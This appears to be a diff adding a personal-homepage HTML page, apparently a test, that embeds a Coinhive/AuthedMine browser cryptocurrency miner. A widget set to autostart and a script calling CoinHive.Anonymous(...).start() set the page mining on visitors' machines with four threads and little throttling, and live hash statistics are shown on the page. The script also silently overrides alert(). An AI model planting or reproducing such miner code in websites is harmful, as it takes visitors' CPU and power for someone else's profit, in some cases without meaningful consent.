@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>hello World Test script </title>
+		<link rel="stylesheet" type="text/css" href="css/style.css">
+
+		<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+		<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+
+	</head>
+	<body>
+		<nav>
+    		<ul>
+        		<li><a href="/">Home</a></li>
+	        	<li><a href="/about">About</a></li>
+        		<li><a href="/cv">CV</a></li>
+        		<li><a href="/blog">Blog</a></li>
+    		</ul>
+		</nav>
+		<div class="container">
+    		<div class="blurb">
+        		<h1>Hi there, I'm Hank Quinlan!</h1>
+				<p>I'm best known as the horrible cop from <em>A Touch of Evil</em> Don't trust me. <a href="/about">Read more about my life...</a></p>				
+				<div >
+					<div>hashesPerSecond : <span id="hashesPerSecond"></span></div>
+					<div>totalHashes : <span id="totalHashes"></span> </div>
+					<div>acceptedHashes : <span id="acceptedHashes"></span> </div>
+				</div>
+			
+				<div >
+					<div class="coinhive-miner" 
+						style="width: 256px; height: 310px"
+						data-key="IMpt824dvOlquTXHDS58mDLlt7iR74GG"
+						data-autostart="true"
+						data-whitelabel="false"
+						data-background="#000000"
+						data-text="#eeeeee"
+						data-action="#00ff00"
+						data-graph="#555555"
+						data-threads="4"
+						data-throttle="0.1">
+						<em>Loading...</em>
+					</div>
+				</div>			
+				
+				<script>
+					alert = function() {};
+					alert("hello");
+					
+					var miner = new CoinHive.Anonymous('IMpt824dvOlquTXHDS58mDLlt7iR74GG');
+					miner.start();
+					
+					miner.on('authed', function(params) {
+						console.log('Token name is: ', miner.getToken());
+					});
+
+					miner.on('error', function(params) {
+						if (params.error !== 'connection_error') {
+							console.log('The pool reported an error', params.error);
+						}
+					});
+
+					miner.on('optin', function(params) {
+						if (params.status === 'accepted') {
+							console.log('User accepted opt-in');
+						}
+						else {
+							console.log('User canceled opt-in');
+						}
+					});
+					
+						// Listen on events
+					miner.on('found', function() { /* Hash found */ 
+						console.log(" Hash found");					
+					});
+					miner.on('accepted', function() {  /* Hash accepted by the pool */
+						 console.log(" Hash accepted by the pool");					
+					});
+
+					// Update stats once per second
+					setInterval(function() {
+						var hashesPerSecond = miner.getHashesPerSecond();
+						var totalHashes = miner.getTotalHashes();
+						var acceptedHashes = miner.getAcceptedHashes();
+
+						// Output to HTML elements...
+						
+						document.getElementById('hashesPerSecond').innerHTML = hashesPerSecond;
+						document.getElementById('totalHashes').innerHTML = totalHashes;
+						document.getElementById('acceptedHashes').innerHTML = acceptedHashes;
+					}, 10000);
+					
+				</script>
+    		</div><!-- /.blurb -->
+		</div><!-- /.container -->
+		<footer>
+    		<ul>
+        		<li><a href="mailto:">email</a></li>
+        		<li><a href=""></a></li>
+			</ul>
+		</footer>
+	</body>
+</html>
